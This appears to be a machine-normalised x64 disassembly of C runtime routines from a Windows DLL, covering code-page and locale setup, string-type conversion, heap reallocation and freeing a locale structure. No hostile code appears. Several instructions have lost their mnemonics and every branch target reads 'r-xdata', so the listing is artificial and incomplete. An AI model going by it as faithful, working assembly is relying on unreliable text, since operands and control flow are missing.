je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_18002b008
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_180025c90
mov rsi rax
call sub_18002ac44
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_18002ad00
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_180022c10
mov rbx rax
xor edi edi
test rax rax
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_1800205e0
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_18002ad90
mov r13d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
[ rcx ]
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ]
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rcx [ rsi + 0xb8 ]
cmp rcx r12
je r-xdata
call sub_180022de4
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_18002094c
test [ rw-data ] 0x1
jne r-xdata
call sub_18002094c
mov esi 0xd
mov ecx esi
call sub_18002d0a8
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
lea r8 [ __dos_header ]
mov edx edi
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x517b0 ] ax
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi 0x100
jge r-xdata
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x4f150 ] al
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ]
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x4f260 ] al
inc edi
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ]
mov ecx esi
call sub_18002cfa8
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
call sub_18002094c
sub_18002b220
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_18002b270
mov [ rsp + 0x10 ] rsi
push rbp
push rdi
push r12
mov rbp rsp
sub rsp 0x60
movsxd rdi ecx
mov r12d edx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_1800221bc
lea r11d [ rdi + 0x1 ]
cmp r11d 0x100
ja r-xdata
mov esi edi
lea rdx [ rbp - 0x20 ]
sar esi 0x8
movzx ecx sil
call sub_18002f2c8
mov edx 0x1
test eax eax
je r-xdata
mov rax [ rbp - 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + rdi * 2 ]
jmp r-xdata
mov [ rbp + 0x38 ] dil
mov [ rbp + 0x39 ] 0x0
mov r9d edx
mov [ rbp + 0x38 ] sil
mov [ rbp + 0x39 ] dil
mov [ rbp + 0x3a ] 0x0
lea r9d [ rdx + 0x1 ]
jmp r-xdata
and eax r12d
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
cmp [ rbp - 0x8 ] al
je r-xdata
mov rcx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] edx
lea r8 [ rbp + 0x38 ]
mov eax [ rcx + 0x14 ]
mov [ rsp + 0x30 ] eax
mov eax [ rcx + 0x4 ]
lea rcx [ rbp - 0x20 ]
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x20 ]
mov [ rsp + 0x20 ] rax
call sub_18002b4b8
test eax eax
jne r-xdata
mov rsi [ rsp + 0x88 ]
add rsp 0x60
pop r12
pop rdi
pop rbp
retn
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18002b358
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x40
lea rbp [ rsp + 0x30 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov esi [ rbp + 0x68 ]
xor edi edi
mov r13d r9d
mov r14 r8
mov r15d edx
test esi esi
jne r-xdata
neg [ rbp + 0x70 ]
mov ecx esi
mov [ rsp + 0x28 ] edi
sbb edx edx
mov [ rsp + 0x20 ] rdi
and edx 0x8
inc edx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
test eax eax
jne r-xdata
mov rax [ rcx ]
mov esi [ rax + 0x4 ]
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
mov rax 0x7ffffffffffffff0
cmp r12 rax
ja r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_1800212e0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r8 r12
xor edx edx
mov rcx rbx
add r8 r8
call sub_180021150
mov r9d r13d
mov r8 r14
mov edx 0x1
mov ecx esi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9 [ rbp + 0x60 ]
mov r8d eax
mov rdx rbx
mov ecx r15d
call [ GetStringTypeW@IAT ]
mov edi eax
call sub_1800213d4
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_18002094c
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_18002b220
sub rsp rax
lea rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_18002b4b8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov ebx r9d
mov rdi r8
call sub_1800221bc
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x30 ] r11d
mov [ rsp + 0x28 ] eax
mov rax [ rsp + 0x90 ]
mov r9d ebx
mov r8 rdi
mov edx esi
mov [ rsp + 0x20 ] rax
call sub_18002b358
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18002b538
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
test rcx rcx
jne r-xdata
test rdx rdx
jne r-xdata
mov rcx rdx
call sub_1800213d4
jmp r-xdata
cmp rdx 0xffffffffffffffe0
ja r-xdata
call sub_18002094c
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call sub_180026120
call sub_180022de4
mov [ rax ] 0xc
mov rcx [ rw-data ]
mov eax 0x1
test rbx rbx
cmove rbx rax
mov r8 rdi
xor edx edx
mov r9 rbx
call [ HeapReAlloc@IAT ]
mov rsi rax
test rax rax
jne r-xdata
xor eax eax
mov rax rsi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
call sub_180022de4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180022d9c
mov [ rbx ] eax
mov rcx rbx
call sub_180026120
test eax eax
je r-xdata
call sub_180022de4
mov rbx rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_180022d9c
mov [ rbx ] eax
jmp r-xdata
cmp rbx 0xffffffffffffffe0
jbe r-xdata
sub_18002b60c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
mov rbp rsp
sub rsp 0x40
movzx esi [ rdx + 0x42 ]
movzx r12d [ rdx + 0x44 ]
mov rdi rcx
test rcx rcx
jne r-xdata
and [ rbp - 0x8 ] 0x0
lea rax [ rcx + 0x8 ]
mov r9d 0x31
lea r13d [ r9 - 0x30 ]
mov [ rbp - 0x10 ] rdx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rdi + 0x10 ]
lea r9d [ r13 + 0x31 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov ebx eax
call sub_180025790
lea rcx [ rdi + 0x18 ]
lea r9d [ r13 + 0x32 ]
mov [ rsp + 0x20 ] rcx
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
or ebx eax
call sub_180025790
lea r9d [ r13 + 0x33 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x20 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x34 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x28 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x35 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x30 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x36 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rdi
or ebx eax
call sub_180025790
lea r9d [ r13 + 0x29 ]
or ebx eax
lea rax [ rdi + 0x40 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x48 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x50 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
lea rax [ rdi + 0x58 ]
lea r9d [ r13 + 0x2c ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2d ]
or ebx eax
lea rax [ rdi + 0x60 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x68 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x38 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x43 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x70 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x44 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x78 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x45 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x80 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x46 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x88 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x47 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x90 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x48 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x98 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
lea rax [ rdi + 0xa0 ]
lea r9d [ r13 + 0x49 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xa8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xb0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xb8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xc0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xc8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x37 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xd0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x38 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xd8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x39 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xe0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xe8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
lea rax [ rdi + 0xf0 ]
lea r9d [ r13 + 0x3b ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0xf8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x100 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x108 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x110 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x40 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x118 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x41 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x120 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x42 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x128 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x27 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x130 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x28 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x138 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
lea rax [ rdi + 0x140 ]
mov [ rsp + 0x20 ] rax
lea r9d [ r13 + 0x1e ]
lea rcx [ rbp - 0x10 ]
mov r8d r12d
mov edx r13d
call sub_180025790
lea r9d [ r13 + 0x1f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x148 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x1003
or ebx eax
lea rax [ rdi + 0x150 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x1009
or ebx eax
lea rax [ rdi + 0x15c ]
mov r8d r12d
xor edx edx
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x30 ]
lea rcx [ rbp - 0x10 ]
lea r13d [ r9 - 0x2f ]
or ebx eax
lea rax [ rdi + 0x170 ]
mov r8d esi
mov edx r13d
mov [ rdi + 0x158 ] r12d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x30 ]
or ebx eax
lea rax [ rdi + 0x178 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x31 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x180 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x32 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x188 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x33 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x190 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x34 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x198 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
lea rax [ rdi + 0x168 ]
lea r9d [ r13 + 0x35 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x28 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1a8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x29 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1b0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1b8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1c0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1c8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1d0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x2e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1a0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x42 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1d8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x43 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1e0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
or ebx eax
lea rax [ rdi + 0x1e8 ]
mov [ rsp + 0x20 ] rax
lea r9d [ r13 + 0x44 ]
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
call sub_180025790
lea r9d [ r13 + 0x45 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1f0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x46 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x1f8 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x47 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x200 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x48 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x208 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x49 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x210 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x218 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x220 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x228 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x4d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x230 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x36 ]
or ebx eax
lea rax [ rdi + 0x238 ]
mov [ rsp + 0x20 ] rax
lea rcx [ rbp - 0x10 ]
mov r8d esi
mov edx r13d
call sub_180025790
lea r9d [ r13 + 0x37 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x240 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x38 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x248 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x39 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x250 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3a ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x258 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3b ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x260 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3c ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x268 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x270 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x278 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x3f ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x280 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x40 ]
mov r8d esi
or ebx eax
lea rax [ rdi + 0x288 ]
mov [ rsp + 0x20 ] rax
lea rcx [ rbp - 0x10 ]
mov edx r13d
call sub_180025790
lea r9d [ r13 + 0x41 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x290 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x26 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x298 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x27 ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2a0 ]
mov r8d esi
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x1d ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2a8 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea r9d [ r13 + 0x1e ]
lea rcx [ rbp - 0x10 ]
or ebx eax
lea rax [ rdi + 0x2b0 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
lea rcx [ rbp - 0x10 ]
mov r9d 0x1003
or ebx eax
lea rax [ rdi + 0x2b8 ]
mov r8d r12d
mov edx r13d
mov [ rsp + 0x20 ] rax
call sub_180025790
or eax ebx
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
mov rdi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rbp
retn
sub_18002c17c
test rcx rcx
je r-xdata
retn
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x8 ]
call sub_18002094c
mov rcx [ rbx + 0x10 ]
call sub_18002094c
mov rcx [ rbx + 0x18 ]
call sub_18002094c
mov rcx [ rbx + 0x20 ]
call sub_18002094c
mov rcx [ rbx + 0x28 ]
call sub_18002094c
mov rcx [ rbx + 0x30 ]
call sub_18002094c
mov rcx [ rbx ]
call sub_18002094c
mov rcx [ rbx + 0x40 ]
call sub_18002094c
mov rcx [ rbx + 0x48 ]
call sub_18002094c
mov rcx [ rbx + 0x50 ]
call sub_18002094c
mov rcx [ rbx + 0x58 ]
call sub_18002094c
mov rcx [ rbx + 0x60 ]
call sub_18002094c
mov rcx [ rbx + 0x68 ]
call sub_18002094c
mov rcx [ rbx + 0x38 ]
call sub_18002094c
mov rcx [ rbx + 0x70 ]
call sub_18002094c
mov rcx [ rbx + 0x78 ]
call sub_18002094c
mov rcx [ rbx + 0x80 ]
call sub_18002094c
mov rcx [ rbx + 0x88 ]
call sub_18002094c
mov rcx [ rbx + 0x90 ]
call sub_18002094c
mov rcx [ rbx + 0x98 ]
call sub_18002094c
mov rcx [ rbx + 0xa0 ]
call sub_18002094c
mov rcx [ rbx + 0xa8 ]
call sub_18002094c
mov rcx [ rbx + 0xb0 ]
call sub_18002094c
mov rcx [ rbx + 0xb8 ]
call sub_18002094c
mov rcx [ rbx + 0xc0 ]
